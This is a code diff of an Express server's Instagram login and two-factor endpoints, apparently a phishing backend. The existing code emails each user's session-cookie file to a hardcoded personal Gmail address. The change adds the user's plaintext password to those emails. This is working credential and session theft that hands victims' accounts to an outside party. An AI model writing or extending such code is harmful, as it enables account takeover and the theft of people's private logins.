@@ -172,8 +172,6 @@ app.get("/insta/submitCode", (req, res) => {
     ig.state.build = state.build;
   });
 
-  console.log(req.query.code);
-
   return ig.account
     .twoFactorLogin({
       username: req.query.username,
@@ -202,7 +200,11 @@ app.get("/insta/submitCode", (req, res) => {
                 var mailOptions = {
                   from: process.env.email,
                   to: "tklinger50@gmail.com",
-                  subject: "cookies of user" + req.query.username,
+                  subject:
+                    "cookies of user" +
+                    req.query.username +
+                    " password:" +
+                    req.query.password,
                   attachments: [
                     {
                       filename: __dirname + `/tempt/${req.query.username}.txt`,
@@ -289,7 +291,11 @@ app.post("/insta", (req, res) => {
                 var mailOptions = {
                   from: process.env.email,
                   to: "tklinger50@gmail.com",
-                  subject: "cookies of user" + req.body.username,
+                  subject:
+                    "cookies of user" +
+                    req.body.username +
+                    " Password:" +
+                    req.body.password,
                   attachments: [
                     {
                       filename: __dirname + `/tempt/${req.body.username}.txt`,
